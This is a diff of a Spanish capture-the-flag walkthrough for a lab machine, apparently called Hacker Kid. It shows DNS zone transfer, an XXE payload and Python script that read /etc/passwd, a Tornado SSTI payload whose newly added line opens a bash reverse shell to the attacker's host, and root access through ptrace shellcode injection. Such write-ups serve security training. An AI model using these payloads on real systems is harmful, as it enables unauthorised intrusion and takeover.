@@ -50,7 +50,7 @@ $nmap -p53,80,9999 -sCV 192.168.0.106 -oN targeted
 
 # Análisis de página web (Port 9999):
 
-- Según la fase de reconocimiento, este puerto está corriendo por detrás un Python Tornado, accedemos a la página principal y vemos un login, por lo que necesitaremos credenciales válidas para entrar, así que seguimos enumerando la máquina.
+- Según la fase de reconocimiento, este puerto está corriendo por detrás un `Python Tornado`, accedemos a la página principal y vemos un login, por lo que necesitaremos credenciales válidas para entrar, así que seguimos enumerando la máquina.
 
 <br><br>
 # Análisis de página web (Port 80):
@@ -62,13 +62,13 @@ $nmap -p53,80,9999 -sCV 192.168.0.106 -oN targeted
 TO DO: Use a GET parameter page_no  to view pages.
 ```
 
-- Probamos la existencia de este supuesto parámetro "page_no" en el link:
+- Probamos la existencia de este supuesto parámetro `"page_no"` en el link:
 
 ```
 http://192.168.0.106/?page_no=1
 ```
 
-- Y efectivamente nos manda a la misma página pero con un texto añadido diferente; si probamos con "page_no=2" nos muestra exactamente lo mismo, así que fuzzeamos en busca de una respuesta diferente:
+- Y efectivamente nos manda a la misma página pero con un texto añadido diferente; si probamos con "page_no=2" nos muestra exactamente lo mismo, así que `fuzzeamos` en busca de una respuesta diferente:
 
 ```bash
 $wfuzz -c -z range,1-1000 -u http://192.168.0.106/?page_no=FUZZ -t 200 --hh=3654
@@ -96,9 +96,9 @@ I am a hacker kid not a dumb hacker. So i created some subdomains to return back
 Out of my many homes...one such home..one such home for me : hackers.blackhat.local
 ```
 
-- Nos filtra un dominio nuevo, los añadimos (tanto el dominio como el subdominio) al "/etc/hosts" y accedemos.
+- Nos filtra un `dominio` nuevo, los añadimos (tanto el dominio como el subdominio) al "/etc/hosts" y accedemos.
 
-- Al acceder al dominio vemos el mismo contenido de la página inicial, sin embargo lo podemos usar para aprovecharnos que el puerto 53 está abierto y hacer un ataque de transferencia de zona y encontrar subdominios desconocidos hasta el momento:
+- Al acceder al dominio vemos el mismo contenido de la página inicial, sin embargo lo podemos usar para aprovecharnos que el puerto 53 está abierto y hacer un `ataque de transferencia de zona` y encontrar subdominios desconocidos hasta el momento:
 
 ```bash
 $dig axfr @192.168.0.106 blackhat.local
@@ -113,14 +113,14 @@ blackhat.local.		10800	IN	NS	ns1.blackhat.local.
 ```
 
 
-- Encontramos un nuevo subdominio, lo añadimos al "/etc/hosts" y accdemos.
+- Encontramos un nuevo `subdominio`, lo añadimos al "/etc/hosts" y accdemos.
 
 <br><br>
 # Ataque XXE (XML External Entity) + Python Scripting:
 
-- Vemos una página de registro, si llenamos con datos aleatorios y hacer click en el botón "register" podemos observar que en el output se nos muestra lo que escribimos en el campo de "email", esto nos hace pensar en varios ataques, pero para confirmar interceptaremos la petición que se hace al registrar los datos con Burpsuite.
+- Vemos una página de registro, si llenamos con datos aleatorios y hacer click en el botón "register" podemos observar que en el output se nos muestra lo que escribimos en el campo de `"email"`, esto nos hace pensar en varios ataques, pero para confirmar interceptaremos la petición que se hace al registrar los datos con Burpsuite.
 
-- Mandamos la petición al repeater y podemos observar en la data una estructura XML, lo que nos confirma un posible XXE, así que procedemos a inyectar los comandos para crear una entidad XML que lea el archivo "/etc/passwd" el cual vamos a mostrar en el campo de "email", quedando la estructura de la siguiente forma:
+- Mandamos la petición al repeater y podemos observar en la data una estructura `XML`, lo que nos confirma un posible `XXE`, así que procedemos a inyectar los comandos para crear una entidad XML que lea el archivo "/etc/passwd" el cual vamos a mostrar en el campo de "email", quedando la estructura de la siguiente forma:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -133,7 +133,7 @@ blackhat.local.		10800	IN	NS	ns1.blackhat.local.
 </root>
 ```
 
-- Al enviar la petición podemos ver como efectivamente se nos muestra el contenido del "/etc/passwd" de la máquina; con esto ya podríamos hacer una búsqueda de ficheros locales del sistema para encontrar posible información que nos sea útil, sin embargo para agilizar este proceso y hacerlo más cómodo desde la terminal, nos crearemos una script en python:
+- Al enviar la petición podemos ver como efectivamente se nos muestra el contenido del "/etc/passwd" de la máquina; con esto ya podríamos hacer una búsqueda de ficheros locales del sistema para encontrar posible información que nos sea útil, sin embargo para agilizar este proceso y hacerlo más cómodo desde la terminal, nos crearemos una script en `python`:
 
 ```bash
 $nano exploitXXE.py
@@ -153,7 +153,7 @@ request=requests.post(target,data=xml)
 print(request.text)
 ```
 
-- Con la script creada, enumeramos usuarios de la máquina víctima:
+- Con la script creada, enumeramos `usuarios` de la máquina víctima:
 
 ```bash
 $python3 exploitXXE.py /etc/passwd | grep "sh$"
@@ -164,13 +164,13 @@ root:x:0:0:root:/root:/bin/bash
 saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
 ```
 
-- Vemos al usuario "saket", verificamos su archivo ".bashrc" en búsqueda de información útil:
+- Vemos al usuario `"saket"`, verificamos su archivo ".bashrc" en búsqueda de información útil:
 
 ```bash
 $python3 exploitXXE.py /home/saket/.bashrc
 ```
 
-- No nos muestra nada, intentamos con el Wrapper para codificar el archivo en base64:
+- No nos muestra nada, intentamos con el `Wrapper` para codificar el archivo en base64:
 
 ```bash
 $python3 exploitXXE.py php://filter/convert.base64-encode/resource=/home/saket/.bashrc
@@ -204,7 +204,7 @@ How can i get to know who are you ??
 http://192.168.0.106:9999/?name=Test
 ```
 
-- Podemos observar que el valor que le pasamos con el parámetro "name" se nos refleja en el output; recordemos que por detrás de este puerto está corriendo un Python Tornado, buscamos vulnerabilidades para esto y encontramos un SSTI [SSTI (Server Side Template Injection) - Tornado Python](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python) 
+- Podemos observar que el valor que le pasamos con el parámetro "name" se nos refleja en el output; recordemos que por detrás de este puerto está corriendo un `Python Tornado`, buscamos vulnerabilidades para esto y encontramos un SSTI [SSTI (Server Side Template Injection) - Tornado Python](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python) 
 
 - Verificamos que es vulnerable:
 
@@ -212,12 +212,14 @@ http://192.168.0.106:9999/?name=Test
 http://192.168.0.106:9999/?name={{7*7}}
 ```
 
-- Y ahora lo que resta por hacer es mandarnos una reverse shell:
+- Y ahora lo que resta por hacer es mandarnos una `reverse shell`:
+
+```
+http://192.168.0.106:9999/?name={\%%20import%20os%20%}{{os.system(%27bash -c "bash -i >%26 /dev/tcp/192.168.0.145/443 0>%261"%27)}}
+```
 
 
-
-
-- Habremos accedido al sistema como el usuario "saket".
+- Habremos accedido al sistema como el usuario `"saket"`.
 
 <br><br>
 
@@ -227,7 +229,7 @@ http://192.168.0.106:9999/?name={{7*7}}
 #### Nota: Podemos ver varios vectores para escalar privilegios, sin embargo aquí se eligió el más "complejo".
 
 
-- Si enumeramos capabilities vemos que el comando "getcap" no funciona y nos tira este mensaje:
+- Si enumeramos `capabilities` vemos que el comando "getcap" no funciona y nos tira este mensaje:
 
 ```js
 Command 'getcap' is available in the following places
@@ -235,7 +237,7 @@ Command 'getcap' is available in the following places
  * /usr/sbin/getcap
 ```
 
-- Así que editamos el PATH para que use la ruta /sbin:
+- Así que editamos el `PATH` para que use la ruta /sbin:
 
 ```bash
 $export PATH=/sbin:$PATH
@@ -258,7 +260,7 @@ $getcap -r / 2>/dev/null
 ```
 
 
-- Nos aprovecharemos en este caso de la capabilitie abjudicada a python2.7, la cual es "cap_sys_ptrace+ep", si consultamos a ChatGPT en que consiste esta capabilitie obtenemos lo siguiente:
+- Nos aprovecharemos en este caso de la capabilitie abjudicada a `python2.7`, la cual es "cap_sys_ptrace+ep", si consultamos a ChatGPT en que consiste esta capabilitie obtenemos lo siguiente:
 
 ```js
 La capacidad "cap_sys_ptrace" es una capacidad del kernel de Linux que permite a un proceso depurar y trazar otros procesos en el sistema. Con esta capacidad, un proceso puede acceder a la memoria, registros y otros recursos de otro proceso en el sistema, lo que puede ser útil para la depuración y el análisis de programas.
@@ -266,11 +268,11 @@ La capacidad "cap_sys_ptrace" es una capacidad del kernel de Linux que permite a
 
 - Así que podemos hacer trazas de ciertos programas usando python, esto suena interesante; si buscamos vulnerabilidades para esto encontramos lo siguiente: [Linux Capabilities - Cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace)
 
-- Vemos que hay una forma de inyectar una shellcode con python para que por bajo nivel nos abra el puerto 5600 y podamos acceder a este con netcat desde nuestra máquina atacante.
+- Vemos que hay una forma de inyectar una `shellcode` con python para que por bajo nivel nos abra el puerto `5600` y podamos acceder a este con netcat desde nuestra máquina atacante.
 
 - Copiamos el código y lo pegamos en un archivo "pwned.py"
 
-- Al ejecutarlo nos pide como argumendo un "PID", en este caso, buscamos algún programa que se esté ejecutando como root:
+- Al ejecutarlo nos pide como argumendo un `"PID"`, en este caso, buscamos algún programa que se esté ejecutando como root:
 
 ```bash
 $ps faux | grep "root"
@@ -289,7 +291,7 @@ Shellcode Injected!!
 Final Instruction Pointer: 0x7fda48f770dcL
 ```
 
-- Ahora si nos conectamos con Netcat desde nuestra máquina atacante apuntando al puerto 5600 de la máquina víctima veremos como se establece la conexión y seremos root.
+- Ahora si nos conectamos con Netcat desde nuestra máquina atacante apuntando al puerto 5600 de la máquina víctima veremos como se establece la conexión y seremos `root`.
 
 ```bash
 $nc 192.168.0.106 5600
